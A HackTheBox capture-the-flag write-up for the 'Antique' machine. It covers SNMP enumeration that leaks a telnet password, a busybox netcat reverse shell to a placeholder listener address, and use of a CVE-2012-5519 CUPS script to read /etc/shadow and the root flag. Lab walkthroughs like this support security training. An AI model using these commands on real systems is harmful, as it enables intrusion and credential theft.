## Welcome everyone!

Today we will explore “Antique”, an easy machine from **HackTheBox**.

Without further ado, let’s get started!



![image](/HTB/Antique/Antique_images/1.png)



(Please ensure that you added the following line `10.129.1.247    antique.htb` to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:



![image](/HTB/Antique/Antique_images/2.png)



It seems that we could only identify Telnet (port 23), which is not very common. We will perform an UDP scan to see whether we missed any open ports:



![image](/HTB/Antique/Antique_images/3.png)



**SNMP** appears to be running on the target, with no other services identified.

Let’s try to use `telnet` to connect to the port 23 we previously identified in order to grab the banner or something that might help us to learn about the software used:



![image](/HTB/Antique/Antique_images/4.png)



We can identify **HP JetDirect** technology released by **HP** that allows to connect printers to a network. Consequently, printers are accessible via an assigned IP address. However, we need to provide a password to interact with the service.

We will try to enumerate the SNMP service using `snmpwalk`:



![image](/HTB/Antique/Antique_images/5.png)



We can confirm the existence of the printer. We can run again the command specifying **the Enterprise-specific MIBs OID** which may contain additional useful information:



![image](/HTB/Antique/Antique_images/6.png)



We receive an output with hexadecimal content. Let’s use **CyberChef** to decrypt it:



![image](/HTB/Antique/Antique_images/7.png)



As we can see, we can decode a password: `P@ssw0rd@123!!123`.

 We can try to provide it to **telnet**:



![image](/HTB/Antique/Antique_images/8.png)



It works! We now have access to the interface;



![image](/HTB/Antique/Antique_images/9.png)



## Initial Access

Running the “`?`” gives us more detail about what we can do here. We can notice that the `exec` command allow us to execute system commands, which means that we can obtain a reverse shell from there! We can attempt to use the following command:

`busybox nc LOCAL_IP NC_PORT -e sh`

(ensure that you have set up a **netcat listener** using `nc -lvnp PORT`)



![image](/HTB/Antique/Antique_images/10.png)



We successfully obtained initial access on the target system! We can stabilize our shell using the following commands

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can now retrieve the **first flag** listing the current directory:



![image](/HTB/Antique/Antique_images/11.png)



## Post-Exploitation

We will need to exploit another vulnerability to retrieve the `root.txt` flag. Since we do not have the password for the user **lp**, we can’t run `sudo -l` to check whether we can run elevated commands. We will need to perform local enumeration to identify a potential privilege escalation path.

We can find an internal service running on the target:



![image](/HTB/Antique/Antique_images/12.png)



The opened port (**631**) is associated to the **CUPS** service which is used to manage printers on a system. Running the `cups-config --version` command indicates us the service version which is 1.6.1. Checking for known vulnerability for this particular version led us to the **CVE-2012-5519** which allows arbitrary file read on a system. We can find a [GitHub repository](https://github.com/p1ckzi/CVE-2012-5519) hosting a bash script for this particular vulnerability. Let’s download it on our system and transfer it to the target:



![image](/HTB/Antique/Antique_images/13.png)



The usage for this script is as follows:

`echo '/path/to/restricted/file' | ./cups-root-file-read.sh`

We will make the script executable using `chmod +x cups-root-file-read.sh`. After that, we should be able to retrieve the /etc/shadow file:



![image](/HTB/Antique/Antique_images/14.png)


![image](/HTB/Antique/Antique_images/15.png)



It works! This confirms that we can read any file on the system, including files belonging to **root**. Since the hash algorithm for the **root** user (SHA-512) is pretty strong, we cannot directly escalate privileges to obtain

However, we can run the script to read the `root.txt` flag located in the `/root` directory, which is enough to confirm the critical compromise of the system. This can be achieved with the following command:

`echo '/root/root.txt' | ./cups-root-file-read.sh`



![image](/HTB/Antique/Antique_images/16.png)



And the root flag is obtained!



![image](/HTB/Antique/Antique_images/17.png)



## Conclusion

The *Antique* machine from HackTheBox demonstrates how seemingly simple services, when poorly configured, can lead to full system compromise. The initial attack surface was minimal, with only Telnet and SNMP exposed externally. However, through systematic enumeration, SNMP revealed that the target was a network printer environment based on HP JetDirect technology, which provided valuable contextual information about the system.

By leveraging SNMP enumeration, we were able to extract sensitive data that ultimately led to valid credentials. These credentials allowed authentication via Telnet, where a command execution feature (`exec`) enabled us to obtain an initial foothold on the system.

Once inside the machine, further local enumeration revealed an internal-only CUPS service running on localhost. This service, part of the printing subsystem, was found to be vulnerable (CVE-2012-5519), allowing arbitrary file read on the system. Exploiting this vulnerability granted access to sensitive files, including `/etc/shadow` and ultimately the `root.txt` flag.

**Thank you for reading!**
